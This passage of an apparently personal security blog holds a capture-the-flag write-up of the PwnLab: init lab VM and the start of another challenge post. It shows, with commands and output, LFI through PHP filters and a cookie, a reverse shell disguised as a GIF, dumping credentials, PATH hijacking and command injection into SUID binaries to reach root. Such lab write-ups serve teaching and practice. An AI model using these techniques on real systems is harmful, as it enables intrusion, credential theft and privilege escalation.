</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|   Salt: pKc2lJniDVf|]&lt;Rg2bwQ
</span><span class='line'>|_  Auth Plugin Name: 88
</span><span class='line'>58026/tcp open  status  1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>The website is an intranet portal for uploading images, but we have to login first.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnlab_init/web.jpg" title="web server" alt="intranet portal"></p>

<p>I ran Nikto on it but there were no interesting finds, except for the following line:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+ /config.php: PHP Config file may contain database IDs and passwords.</span></code></pre></td></tr></table></div></figure>


<p>However, when I tried to read that file, all I got was a blank page. I&rsquo;ve noticed that the URLs for the pages look like this: <a href="http://192.168.164.129/?page=login">http://192.168.164.129/?page=login</a> for the login page and <a href="http://192.168.164.129/?page=upload">http://192.168.164.129/?page=upload</a> for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI method that uses PHP filters</a>. The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it:</p>

<p><code>url?page=php://filter/convert.base64-encode/resource=config</code></p>

<p>This returned a base64 string that when decoded, gave me the MySQL credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>$server     = "localhost";
</span><span class='line'>$username = "root";
</span><span class='line'>$password = "H4u%QJ_H99";
</span><span class='line'>$database = "Users";
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p>Now we can connect to that database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -h 192.168.217.143
</span><span class='line'>ERROR 1045 (28000): Access denied for user 'root'@'192.168.217.132' (using password: NO)
</span><span class='line'>root@kali:~# mysql -u root -p -h 192.168.217.143
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 41
</span><span class='line'>Server version: 5.5.47-0+deb8u1 (Debian)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>MySQL [(none)]&gt; use Users
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>MySQL [Users]&gt;  </span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we have here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [Users]&gt; show tables;
</span><span class='line'>+-----------------+
</span><span class='line'>| Tables_in_Users |
</span><span class='line'>+-----------------+
</span><span class='line'>| users           |
</span><span class='line'>+-----------------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>MySQL [Users]&gt; select * from users;
</span><span class='line'>+------+------------------+
</span><span class='line'>| user | pass             |
</span><span class='line'>+------+------------------+
</span><span class='line'>| kent | Sld6WHVCSkpOeQ== |
</span><span class='line'>| mike | U0lmZHNURW42SQ== |
</span><span class='line'>| kane | aVN2NVltMkdSbw== |
</span><span class='line'>+------+------------------+
</span><span class='line'>3 rows in set (0.05 sec)</span></code></pre></td></tr></table></div></figure>


<p>3 users with base64 encoded passwords!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kent / JWzXuBJJNy
</span><span class='line'>mike / SIfdsTEn6I
</span><span class='line'>kane / iSv5Ym2GRo</span></code></pre></td></tr></table></div></figure>


<p>I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let&rsquo;s take a look at the source code of the upload page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">  &lt;body&gt;</span>
</span><span class='line'><span class="x">      &lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&gt;</span>
</span><span class='line'><span class="x">          &lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&gt;</span>
</span><span class='line'><span class="x">          &lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&gt;</span>
</span><span class='line'><span class="x">      &lt;/form&gt;</span>
</span><span class='line'><span class="x">  &lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> <span class="nb">strrchr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;.jpg&quot;</span><span class="p">,</span><span class="s2">&quot;.jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;.gif&quot;</span><span class="p">,</span><span class="s2">&quot;.png&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span><span class="s1">&#39;image&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 001&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 002&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">substr_count</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 003&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 4&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey&rsquo;s reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code></p>

<p>My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I&rsquo;ve looked t the source code of the index page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
</span><span class='line'><span class="c1">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="c1">// Not implemented yet.</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">&lt;head&gt;</span>
</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
</span><span class='line'><span class="x">&lt;/head&gt;</span>
</span><span class='line'><span class="x">&lt;body&gt;</span>
</span><span class='line'><span class="x">&lt;center&gt;</span>
</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
</span><span class='line'><span class="x">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/center&gt;</span>
</span><span class='line'><span class="x">&lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt; </span>
</span></code></pre></td></tr></table></div></figure>


<p>That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: lang=../../../../etc/passwd</span></code></pre></td></tr></table></div></figure>


<p>The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</span></code></pre></td></tr></table></div></figure>


<p>And in our listener, we have a hit!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
</span><span class='line'> 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c "import pty;pty.spawn('/bin/sh');"</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane&rsquo;s home folder there&rsquo;s an interesting SUID binary called <em>msgmike</em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike</span></code></pre></td></tr></table></div></figure>


<p>Trying to run it gives an error:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ ./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane&rsquo;s home to the PATH variable, we should be able to run an arbitrary program with mike&rsquo;s privileges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ echo "/bin/bash" &gt; cat
</span><span class='line'>echo "/bin/bash" &gt; cat
</span><span class='line'>kane@pwnlab:~$ chmod 777 cat
</span><span class='line'>chmod 777 cat</span></code></pre></td></tr></table></div></figure>


<p>Here we want to run bash as mike. Let&rsquo;s see how the PATH looks:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ echo $PATH
</span><span class='line'>echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s add the current location to the PATH:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=.:$PATH
</span><span class='line'>kane@pwnlab:~$ echo $PATH
</span><span class='line'>echo $PATH
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:</span></code></pre></td></tr></table></div></figure>


<p>Running the binary turns us into mike!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ ./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>mike@pwnlab:~$</span></code></pre></td></tr></table></div></figure>


<p>In mike&rsquo;s home there is another SUID binary, this time owned by root. We can see where this is going..</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
</span><span class='line'>mike@pwnlab:/home/mike$ ./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message for root: pwn incoming
</span><span class='line'>pwn incoming
</span><span class='line'>pwn incoming</span></code></pre></td></tr></table></div></figure>


<p>This binary takes an input and outputs it to the screen, while also appending it to a file in root&rsquo;s home (below line is taken from strings output)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/echo %s &gt;&gt; /root/messages.txt</span></code></pre></td></tr></table></div></figure>


<p>We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./msg2root 
</span><span class='line'>./msg2root 
</span><span class='line'>Message for root: hey;/bin/sh
</span><span class='line'>hey;/bin/sh
</span><span class='line'>hey
</span><span class='line'># </span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re root now! Read the flag and game over:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>.-=~=-.                                                                 .-=~=-.
</span><span class='line'>(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
</span><span class='line'>(_ ___)  _____                             _                            (_ ___)
</span><span class='line'>(__  _) /  __ \                           | |                           (__  _)
</span><span class='line'>( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
</span><span class='line'>(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
</span><span class='line'>(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
</span><span class='line'>(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
</span><span class='line'>( _ __)                     __/ |                                       ( _ __)
</span><span class='line'>(__  _)                    |___/                                        (__  _)
</span><span class='line'>(__  _)                                                                 (__  _)
</span><span class='line'>(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
</span><span class='line'>( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
</span><span class='line'>(__  _) this challenge.                                                 (__  _)
</span><span class='line'>(_ ___)                                                                 (_ ___)
</span><span class='line'>( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
</span><span class='line'>(__  _) reading it                                                      (__  _)
</span><span class='line'>(__  _)                                                                 (__  _)
</span><span class='line'>(__  _)                                             For sniferl4bs.com  (__  _)
</span><span class='line'>( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
</span><span class='line'>(__  _)                                                                 (__  _)
</span><span class='line'>(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
</span><span class='line'>`-._.-'               </span></code></pre></td></tr></table></div></figure>


<p>This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ You're currently going through a   \
</span><span class='line'>| difficult transition period called |
</span><span class='line'>\ "Life."                            /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Destroy The Necromancer]]></title>
    <link href="http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer/"/>
    <updated>2018-06-09T13:02:55+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s challenge is a boot2root with 11 flags to collect.</p>

<!-- more -->


<p>The Nmap scan took really long and found nothing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.217.142
</span><span class='line'>Host is up (0.00023s latency).
</span><span class='line'>All 65535 scanned ports on 192.168.217.142 are filtered
